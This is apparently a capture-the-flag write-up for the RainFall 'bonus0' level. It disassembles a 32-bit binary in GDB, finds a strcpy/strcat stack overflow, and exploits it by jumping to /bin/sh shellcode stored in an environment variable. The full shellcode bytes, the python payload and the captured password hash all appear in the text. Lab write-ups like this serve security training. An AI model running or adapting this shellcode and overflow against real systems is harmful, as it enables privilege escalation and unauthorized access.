# bonus0

## exploring the binary
```shell
bonus0@RainFall:~$ ./bonus0
 -
phantom
 -
phantom
phantom phantom
bonus0@RainFall:~$ ./bonus0
 -
phantom
 -
society
phantom society
```
The binary waits for two strings from standard input, then prints them together, separated by a space.

## GDB analysis
```shell
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.
```
During runtime, the function <code>pp()</code> is called from <code>main()</code>, and the <code>puts()</code> function is used to print the output. We inspect <code>pp()</code>:

```shell
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    $0x80486a4,%ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx
   0x0804856f <+81>:	mov    $0x0,%eax
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:	mov    %edx,%edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax
   0x08048582 <+100>:	add    0x8(%ebp),%eax
   0x08048585 <+103>:	movzwl (%ebx),%edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret
End of assembler dump.
```
We see that <code>pp()</code> invokes potentially exploitable functions such as <code>strcpy()</code> and <code>strcat()</code>, and it also calls <code>p()</code> twice. We proceed to disassemble <code>p()</code>.
```shell
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
```
This function is responsible for invoking the <code>read()</code> function. We observe that the value <code>0x1000</code> (4104) is pushed into the memory location specified by <code>0x8(%esp)</code>, setting up the buffer size for the <code>read()</code> call. The effective address of the memory location <code>-0x1008(%ebp)</code> is then loaded into the <code>eax</code> register, which limits the bytes read to 4096 (diff 8).

## buffer overflow
The buffer overflow limitation will be determined by <code>strcat()</code>, so we will examine the buffer's state before <code>puts()</code> is called in <code>main()</code>. Our objective is to pass two long strings as parameters and then inspect the value of the instruction pointer register (<code>EIP</code>) at the point of <code>puts</code> execution.
``` shell
(gdb) b *0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmn

Breakpoint 1, 0x080485c0 in main ()
(gdb) step
Single stepping until exit from function main,
which has no line number information.
AAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRST��� ABCDEFGHIJKLMNOPQRST���
Warning:
Cannot insert breakpoint 0.
Error accessing memory address 0x51504f4e: Input/output error.

0x4d4c4b4a in ?? ()
(gdb) i reg
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff730	0xbffff730
ebp            0x49484746	0x49484746
esi            0x0	0
edi            0x0	0
eip            0x4d4c4b4a	0x4d4c4b4a
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Now, we observe that register overwriting begins at the tenth character, suggesting an offset of 9. This size makes it fairly impossible to use a classic <code>ret2libc</code> attack, so we will use a <code>shellcode</code> for this purpose. The piece of hexadecimal code that we use as a payload for execution has already been pre-made for us in [shellcode injection](https://www.exploit-db.com/exploits/13357):
``` shell
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
To export this as an environmental variable, we include <code>NOP</code> (<code>\x90</code>) within the shellcode. These instructions act as padding, ensuring that the shellcode is properly aligned within the buffer or memory space it occupies. Additionally, they make the shellcode easier to locate in environments where memory layout may shift.
``` shell
bonus0@RainFall:~$ export SCODE=`python -c 'print("\x90" * 150 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
bonus0@RainFall:/tmp$ cc addr.c -o addr
bonus0@RainFall:/tmp$ ./addr
SCODE set at 0xbffff85b
```
The only thing left to do is to expose the address of this environmental variable, which can be easily accomplished with our custom C binary. Then, we can construct a simple input that will pass both strings (separated by <code>\n</code>) following these rules:
- the total size of the first buffer is 4096
- offset of the second string is equal to 9
- overflow will happen in the second string
``` shell
4095 * placeholder | \n | 9 * placeholder | shellcode | 150 * placeholder
```

## exploit
``` shell
bonus0@RainFall:~$ python -c 'print "F"*4095 + "\n" + "F"*9 + "\xbf\xff\xf8\x5b"[::-1] + "F"*150' > /tmp/flagb0
bonus0@RainFall:~$ cat /tmp/flagb0 - | ./bonus0
 -
 -
FFFFFFFFFFFFFFFFFFFFFFFFFFFFF[���FFFFFFF��� FFFFFFFFF[���FFFFFFF���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
